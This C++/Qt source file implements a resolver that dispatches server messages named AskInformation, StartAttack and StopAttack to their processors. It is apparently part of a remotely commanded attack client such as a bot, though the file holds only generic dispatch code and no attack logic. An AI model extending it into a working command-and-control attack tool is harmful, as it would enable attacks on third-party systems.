#include "processorresolver.h"

#include "askinformationprocessor.h"
#include "startattackprocessor.h"
#include "stopattackprocessor.h"
#include "Network/Messages/Server/askinformationmessage.h"
#include "Network/Messages/Server/startattackmessage.h"
#include "Network/Messages/Server/stopattackmessage.h"

using namespace network::messages::server;

namespace processors
{
    ProcessorResolver::ProcessorResolver()
    {
        bind(AskInformationMessage::staticMetaObject, std::make_shared<AskInformationProcessor>());
        bind(StartAttackMessage::staticMetaObject, std::make_shared<StartAttackProcessor>());
        bind(StopAttackMessage::staticMetaObject, std::make_shared<StopAttackProcessor>());
    }

    void ProcessorResolver::bind(const QMetaObject &type, std::shared_ptr<MessageProcessorBase> processor)
    {
        resolutions_.insert(type.className(), processor);
    }

    std::shared_ptr<MessageProcessorBase> ProcessorResolver::resolve(std::shared_ptr<ServerMessage> message)
    {
        QString className = message.get()->metaObject()->className();
        std::shared_ptr<MessageProcessorBase> p = resolutions_.value(className);
        return p;
    }
}
